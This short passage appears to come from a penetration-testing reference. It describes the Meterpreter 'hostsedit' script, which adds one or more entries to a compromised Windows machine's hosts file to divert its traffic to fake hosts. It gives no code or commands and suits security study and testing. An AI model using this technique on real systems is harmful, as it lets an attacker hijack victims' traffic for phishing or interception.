The hostsedit Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.
